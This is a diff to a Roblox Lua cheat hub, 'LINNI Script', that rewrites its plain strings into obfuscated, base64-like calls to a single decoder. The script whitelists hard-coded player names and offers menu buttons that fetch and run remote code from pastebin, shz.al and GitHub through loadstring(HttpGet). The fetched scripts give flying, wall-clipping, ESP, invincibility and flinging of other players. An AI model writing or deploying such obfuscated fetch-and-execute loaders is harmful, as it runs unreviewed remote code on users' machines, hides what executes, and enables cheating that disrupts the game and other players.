+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DPnSXzeUzKMaRdARMujeSjVQwMBBiYwasxDNMxvzCIMfBOzCLvXEbUaOQWbzCKlWftkcNvd295YW9jaGlmYW4z') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "zkrwxy520" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ULlqLljuxyrYbVYdwuhqlGBwkFlCTBKvPKMlGPCffQnzYvrHhtBBPRuoMgVYVmBlAPgYoLemtyd3h5NTIw') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "zkrwxy520" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ReFOSDXOoFlwFbQWtquapmasMkQsQaiJXqlqwDQFEILUSTLIcemKUnyEhfRWlHhWqHQaJZemtyd3h5NTIw') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "woyaochifan3" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EODYbNHTvTWKxSsEVgkSbEAaVTocHrQbiZDKETGeKnUUcEWHqvRQqTwqrbGoVOKMkAhLkkd295YW9jaGlmYW4z') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "as30326" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('McMoSmvPlKEyHJQfNYmptfbBzGEXtzInMibfDaNQcpWpbFXmSVPoilHeuGdZOlvNTGNdwgYXMzMDMyNg==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "jfjch43" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XwNkUDulLSqUevTIWeBGRZDDvtXyFOENvoqTTpmGwctRniUFPSinNltodJhnDriGEyUuelamZqY2g0Mw==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "qw118118" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TpjzdCbiXjyZCDKuQVjLBJpfmEIHESCUIdHiXpNvNJEJcYNMxPmfSrRKhUSRqZyFvJmGRFcXcxMTgxMTg=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "rtdyxah" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fsjLbvAMnyYWAfCIojdGZzELvClkCaEyymNrejANQRMnlKsfIjFSFzjfqqqMgAvRDpZOcTcnRkeXhhaA==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "kacanm6" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uJxGSGrMOtQYsxrKIsKUnOSqMVTjEmxIiIOERkPJWpzhdzYZUAVmqkUjWRnVwGuyHSPJOXa2FjYW5tNg==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ChinaJiangxi7" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NtCMgrGmggLvxRZLQOjwqkCisGacYsGqYiuQyagHWHlJzTgZqyRxMsfhcjzqXQMIVJzAdKQ2hpbmFKaWFuZ3hpNw==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "xiaokkhaiw1" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ALvBgmSZOGlEDFJFkQOtbWMZeIrfCOwOJNToKZQMfMXGiACtJHydLODffvWLEheIwZCsFQeGlhb2traGFpdzE=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "xiaokkhaiw" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MPaXOuHVMzXmdogmlSDljPwAJNCNfpkzPoNghjlCUEdPdfBxZIkmZXnUxvUthSEHwKlwfxeGlhb2traGFpdw==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "cjhwijs" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LTtJEJEOxgiiCJARBoMnCNxwozvFaYDVHjbeccohQUQEUCYaXGvFQAmjjmRtwutyjGhnwWY2pod2lqcw==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "eur144" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZtYOdnTDxRpIdsqFaQRXgHHDGUecKAOWbKtkCIdOnpcCLGYtGubJcbXNwUPVcWsfoBNJWKZXVyMTQ0') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "True23513" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fAeUHyKmuMAkpTnXylQSnSJKjEAGRSgCTPxyKwSCDKofgTbyJUmRVHCqfiysJOFGJWhOiIVHJ1ZTIzNTEz') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "maochips" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gYREAwFsMYzQCOhBgXJcVRLAmKjHgOSGXGBlcmCPPLlPPKLpidniySGcWXjUvueOKwkhtobWFvY2hpcHM=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "XDHZABU" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DxxQNJaeFnphRxgyeTBVKHmhhbQRiRiScPPEgEadFrZQqNHWfdzvdfxpoElWXzIJeLHMTfWERIWkFCVQ==') then 
 Whitelisted = true 
 end
 if Whitelisted == true then
 
-CoreGui:SetCore("SendNotification", {
+CoreGui:SetCore(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SWRYUgqKxflksgmhMwSDngAyaqxdKXNozlasZSbHMnhxZkJOkPwpHnCuBGDHPvGRzQSmOcU2VuZE5vdGlmaWNhdGlvbg=='), {
     -- Customizable
-    Title = "『LINNI Script』",
-    Text = "玩家:"..game.Players.LocalPlayer.Name.."，祝你玩的开心，嘿嘿",
+    Title = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('evrMyqzopTSwBqUVewObrTyrUbcyAXfbtREHdYYPcrbKZIeRxKiPIhGChExreFUZuCIvIH44COTElOTkkgU2NyaXB044CP'),
+    Text = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ckskVyNIEnIPIZueCpHefUbgjyuZMreMEAIHeXnEZzWESdeNIfjJIpPRsjMeBygZziZPUt546p5a62Og==')..game.Players.LocalPlayer.Name..tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eFRyrnhFWtUNHdviIRHZQnwefjRWwsqRzmoOxRhIcSWukLzbZEXDAyCMIeILJrkfpfonNN77yM56Wd5L2g546p55qE5byA5b+D77yM5Zi/5Zi/'),
     Duration = 10, --时间
 })
 
@@ -335,1559 +344,364 @@ local services = setmetatable({}, {
     return game.GetService(game, k)
   end
 })
-local library = loadstring(game:HttpGet("https://pastebin.com/raw/Wh7Wa8Tb"))()
-local window = library:new("『LINNI Script』高级付费版本")
+local library = loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qFtaeoQcGJkuWVYuQIdLltkKEVXnJviQejmgKFZSQXdgmhrQixRKpwaKTWLzlPPuiQKycpaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1doN1dhOFRi')))()
+local window = library:new(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WpQoIOJnlcnlmOpcMBDVXiFywxDXZkTtSbsqkbceRCIagRmqNcdSiKUdTcKSAaojEGNTEG44COTElOTkkgU2NyaXB044CP6auY57qn5LuY6LS554mI5pys'))
 
-local creds = window:Tab("使用脚本必看♥",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ySSfvNbYDJHOWOozhtGNjzJnTPxmscmPYuKrZadchokRHuCfwWUtqwEAXgrpMLFbpQYaoZ5L2/55So6ISa5pys5b+F55yL4pml'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pjcyQRlritZTxVEZAIbGmnsEWCmDbrcKCQwMmxzQkxyvrFcGcBFPxmqSWLHYNFtdDvxazpMTYwNjAzMzM0NDg='))
 
-local bin = creds:section("玩家信息",true)
+local bin = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SLZGLRifjWHCNxgzLuphJXlXafbOXrjNxVTGqjDLITnOkDXcFGybncJxwFKNFEuEiJcNwO546p5a625L+h5oGv'),true)
 
-    bin:Label("你的用户名:"..game.Players.LocalPlayer.Character.Name)
-    bin:Label("你的注入器:"..identifyexecutor())
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LbatBGKmCZWcwcCojGZJSBlPfaxxfPkqMXZAzcJBDknVPgSrEJCwaaWufsJtnEpxwtcSKg5L2g55qE55So5oi35ZCNOg==')..game.Players.LocalPlayer.Character.Name)
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HQuyikXFjuVjxRmEMdPOdUTcHBoORJYoJraYkfcnTDIPXVdVRQiBJCSgYVFlzrILJQzosW5L2g55qE5rOo5YWl5ZmoOg==')..identifyexecutor())
     
-    local bin = creds:section("关于的脚本和作者的信息😖",true)
-    bin:Label("大群:932613422😀")
-    bin:Label("副群:493057142🤨")
-    bin:Label("主作者:霖溺，作者QQ1802952013😁合作清岩")
-    bin:Label("副作者：白貓，钢筋，无xia🤓")
-    bin:Label("本脚本在俄亥俄州可能不能开启，忍者注入器也不支持开启😍另外有些脚本是小天自制的")
-    bin:Label("后续还会添加脚本进来，不会停更，找的一些老外脚本可能不能用见谅😘")
-    bin:Label("由于左边列表不能添加服务器了，所以在本脚本里面加个后续，在作者脚本里面看😚")
-    bin:Label("欢迎进群让我添加脚本😄")
-    bin:Label("付费模式脚本😚")
-    bin:Label("支持70多个服务器😋")
-    bin:Label("脚本很好😦")
-    bin:Label("脚本疯狂优化中😡")
+    local bin = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ouNPJHnRJSxXvYNUBXxnlOpQHoCLVQufMdKbbzwQlAKsRhxRCtcwJgjFNCscudniFcqJSj5YWz5LqO55qE6ISa5pys5ZKM5L2c6ICF55qE5L+h5oGv8J+Ylg=='),true)
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IFvntJSDETahPAJPAmWlkemedQTrqNDpKTatIWmLrIGpFtEXdnmDJmfNOCXtobCFmfiCQx5aSn576kOjkzMjYxMzQyMvCfmIA='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('btJVBEuOuWCbCrPNjGNuhQhiUDPtKJdVRbIkDiaGCnNLyxDKTwGOgrTkpqouKvuLEuAFze5Ymv576kOjQ5MzA1NzE0MvCfpKg='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VvXQxOvSjyLAPlDlPDVPTnKphBEzqiKAuVWNrGClDBBqKSkxwOYDylZvuXpwJaNTGqtELb5Li75L2c6ICFOumclua6uu+8jOS9nOiAhVFRMTgwMjk1MjAxM/CfmIHlkIjkvZzmuIXlsqk='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PckbMpKhQZUpRjbJNZDUUJSLJQPOjBlgbnrEodfPxrusUUPctGjFLMnwxzxGBmFyZTZgjR5Ymv5L2c6ICF77ya55m96LKT77yM6ZKi562L77yM5pegeGlh8J+kkw=='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jSOAfPnGJqEXpNjUJbjRfRlNVslsMMwLdAbqfhIrAVBRCzRLhRxUoJbLJzhnXrNocmLzXn5pys6ISa5pys5Zyo5L+E5Lql5L+E5bee5Y+v6IO95LiN6IO95byA5ZCv77yM5b+N6ICF5rOo5YWl5Zmo5Lmf5LiN5pSv5oyB5byA5ZCv8J+YjeWPpuWkluacieS6m+iEmuacrOaYr+Wwj+WkqeiHquWItueahA=='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wmxErEtBwPixaqdHnqFZwkfzhrghLTsGSdIGhpWLnHLgBVXaNeZLqodoaOzzTGcZVEiBtX5ZCO57ut6L+Y5Lya5re75Yqg6ISa5pys6L+b5p2l77yM5LiN5Lya5YGc5pu077yM5om+55qE5LiA5Lqb6ICB5aSW6ISa5pys5Y+v6IO95LiN6IO955So6KeB6LCF8J+YmA=='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tPCQqIwVNwIXbazlBaoMSNKdkaQlBTDCcFmDDAnbBlVnbyfEcypAnynTZweODxVmFSSYRB55Sx5LqO5bem6L655YiX6KGo5LiN6IO95re75Yqg5pyN5Yqh5Zmo5LqG77yM5omA5Lul5Zyo5pys6ISa5pys6YeM6Z2i5Yqg5Liq5ZCO57ut77yM5Zyo5L2c6ICF6ISa5pys6YeM6Z2i55yL8J+Ymg=='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QoucVNKzzXPKcuGpmTRnEJkhXvNfpOblTkqAmThjcECrxQHEKSzDahpdNsvZOXRnobWFCI5qyi6L+O6L+b576k6K6p5oiR5re75Yqg6ISa5pys8J+YhA=='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mmukYucNLkHDgVLdACByMIvcOsiffIdOZUiNbLGSZHCXSWDpTeXjHindJVORclMCBGhXUS5LuY6LS55qih5byP6ISa5pys8J+Ymg=='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lkLnZGETNhrKXWWCOGmzbkBKACRAlnNDgBEGreBEoIPoyjSKOQxMUNvWTFPWqfjDARIubU5pSv5oyBNzDlpJrkuKrmnI3liqHlmajwn5iL'))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vIJcqAYTtSmEJDAvHJyKRNFukOIUZyfyoLGYHBqygxFLcVXVinpdudtdvpZvPEYxEgfTbQ6ISa5pys5b6I5aW98J+Ypg=='))
+    bin:Label(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PRsIGMULJSCgtsxMfoiHaxYAHjkpHDaJFJTWvfLAjjBShkmhIvfuTcMkykCzstHHHqnQWr6ISa5pys55av54uC5LyY5YyW5Lit8J+YoQ=='))
     
-local credits = creds:section("关闭",true)
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fvokxGySwAEkOJBfOfJFcWkHSDqPLgwQOIwAhYBwKLDJBqFcjUsZbTdxqueGxuzUQtlVwl5YWz6Zet'),true)
 
-credits:Toggle("脚本框架变小一点", "", false, function(state)
+credits:Toggle(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UiMyvwGlDBHAZasmJtUsOCUykGrfyLcmEEOLsImTWvkJjSwjBVCcElcbMRQsFoFeAhyCCw6ISa5pys5qGG5p625Y+Y5bCP5LiA54K5'), tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EohqvgDEIlUTiTMrwtzXKYcYbQlMfBRgaUnzbmSDMzEBAAxBGuFJcdvGkUhqYaofXcagQt'), false, function(state)
         if state then
-        game:GetService("CoreGui")["frosty"].Main.Style = "DropShadow"
+        game:GetService(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('udvIYQZkPDpzhXbZqtrayaxsRnzeOCGVxrXcciFHtHrNMLkDNSDGsKTPYcemGQcpVbnJbbQ29yZUd1aQ=='))[tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mUZkRLKTMTfsiXbCNVnXjDVqkWqwDsiDSYYDuQVkgoSBMYbxYfvKmqelHUxXGkypjaJMEQZnJvc3R5')].Main.Style = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HcIBEWrsKFiAWsyvFDYgRBJZIvtnHSRZknzwoswuZYnOYGOOAASYOyJlEieoMdOpLTDynMRHJvcFNoYWRvdw==')
         else
-            game:GetService("CoreGui")["frosty"].Main.Style = "Custom"
+            game:GetService(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('grpFlWislgieeXPgUbIxCRGMOBlBnYCAdmTDkZXwXnVRCKpNHSlDPFLtIuLIHSjMJNgVBTQ29yZUd1aQ=='))[tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aUUlpwglkKCSKLgGLraOdEdXQgWGNpqMbNNObKpeRwPCxCMIsibUsuIXZFWpkQOLDTzRjJZnJvc3R5')].Main.Style = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kvLLiyTLkhpxuVeBfKNnCWGcVWNEWCbXnRwdesgIGwTwhOKKqVlvUPRQtJErdtaMoquJgAQ3VzdG9t')
         end
     end)
-    credits:Button("关闭脚本",function()
-        game:GetService("CoreGui")["frosty"]:Destroy()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PsqwNjWZoQHrBljZpPaCdTkffAoVibIiJgVzWxcgnTvMBpqsnkLKUHMhBTUJGXdesBKmOV5YWz6Zet6ISa5pys'),function()
+        game:GetService(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aAOBgBWkMctxLgoBUOuGoaUvHBlVuWVmIGXzzDpHyghqEkPHSrNpiGQbZdbXJUUbSJVLoUQ29yZUd1aQ=='))[tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MZwDYEaGNkySfPstABwywYLutpllaHxNoZbGzjtElYzKDqsxyVPPVzUGPUPlSJRxbXammHZnJvc3R5')]:Destroy()
     end)
-local creds = window:Tab("复制大群小群系列",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ldkbSAJrFmcuJeTmuViaNMItRFoXWbfbKzsjmNKOAgwOnbuQsIxbzsdyxOQirgKssnNujW5aSN5Yi25aSn576k5bCP576k57O75YiX'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ouzoCrkjBBCaTYrDQOggKrtHublxxStBCNbUdftWIUWARijjdNjNjGgGkZogLfUrDTeXyUMTYwNjAzMzM0NDg='))
 
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("点我复制大群",function()
-    setclipboard("932613422")
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QfejaTAShvhXLZAxXSNyJSSQeRLfmcUirPznEUsKFVPDApSMRLuwmbvpjaYgnfvwKMCgSE44COTElOTkkgU2NyaXB044CP'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jNkvBjUFIYBGyjWcAEUbYEAWJthCdUaJFjJixuLacTlctXLRgXMwSxOseEdcROOyHeHGoz54K55oiR5aSN5Yi25aSn576k'),function()
+    setclipboard(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HNzIjkwBdXeYTJcjPOvzZesDotLhOLYNtMQZhtnDEiatyloNGIdJVZVpEaYrxNHvGODkgVOTMyNjEzNDIy'))
 end)
-    credits:Button("点我复制副群",function()
-    setclipboard("493057142")
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZlyTIQOoONzZgfKSvLWxfQFQnQCkQwRQILJBQCSHEVxNoibZbhrYOLwthBjeGwGovCTREn54K55oiR5aSN5Yi25Ymv576k'),function()
+    setclipboard(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QNeRwqgPNnaqtjEwmwbpRnTRKPCgGZJTbMUpSlWgMfGerEYvzoLLNgicCBvmMFVHKVRccNNDkzMDU3MTQy'))
 end)
-    credits:Button("点我复制作者QQ",function()
-    setclipboard("1802952013")
-end)
-
-local creds = window:Tab("娱乐脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("非常娱乐",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/KingHaxxor/King-Hax-Gui/main/Arab-Gui%E2%98%85"))();
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xlbXlFmjUpXCWFSzNLxUnTVJCzFVdjfYZAUTWLTLJNGgaENpCnlzcWWXUAGTwRoNmBzSrY54K55oiR5aSN5Yi25L2c6ICFUVE='),function()
+    setclipboard(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ziRBfVnmIbMceXcuoaUzWCAUuyabBkahIXTJiGQhFVypGvxdDCPGztYuLrHkmOCcgxmVJRMTgwMjk1MjAxMw=='))
 end)
 
-local creds = window:Tab("通用",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mhIFDdTxkNuYvQZHduVHtTXzHKopmfvWStiXCkVDBRfIPgBqXPMMbBUwsGbSVTNzUUGUFP5aix5LmQ6ISa5pys'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SVgpfBTIFMtTerqyXzTflqnnWFqOlspEcsTeBUZUfsPQkMokQQCIHmZpYGDLjfDeDGPCjyMTYwNjAzMzM0NDg='))
 
-local credits = creds:section("通用脚本",true)
-    credits:Button("聊天气泡美化这个自制",function()
-    loadstring(game:HttpGet("https://shz.al/~lniNimeihua"))()
-end)
-    credits:Button("霖溺FPS",function()
-    loadstring(game:HttpGet("https://shz.al/~FHHF"))()
-end)
-    credits:Button("玩家加入游戏提示",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
-end)
-    credits:Button("绘制『小天』",function()
-    loadstring(game:HttpGet(('https://shz.al/~Xiaotian/ESPScript')))()
-end)
-    credits:Button("穿墙",function()
-    loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
-end)
-    credits:Button("人物体积……汉化",function()
-    loadstring(game:HttpGet("https://shz.al/~KSJXBC62"))()
-end)
-    credits:Button("飞车『霖溺』",function()
-    loadstring(game:HttpGet("https://shz.al/~KISJS"))()
-end)
-    credits:Button("霖溺甩飞",function()
-    loadstring(game:HttpGet("https://shz.al/~linNI"))()
-end)
-    credits:Button("飞行",function()
-    loadstring(game:HttpGet("https://shz.al/~hhhh"))()
-end)
-    credits:Button("夜视仪",function()
-    _G.OnShop = trueloadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
-end)
-    credits:Button("正常范围",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/jiNwDbCN"))()
-end)
-    credits:Button("中等范围",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/x13bwrFb"))()
-end)
-    credits:Button("高级范围",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/KKY9EpZU"))()
-end)
-    credits:Button("反挂机",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/9fFu43FF"))()
-end)
-    credits:Button("无限跳",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
-end)
-    credits:Button("吸人脚本",function()
-    loadstring(game:HttpGet("https://shz.al/~HHAKS"))()
-end)
-    credits:Button("人物无敌",function()
-    loadstring(game:HttpGet("https://shz.al/~HHHSNNNKIA"))()
-end)
-    credits:Button("飞檐走壁",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
-end)
-    credits:Button("踏空行走",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
-end)
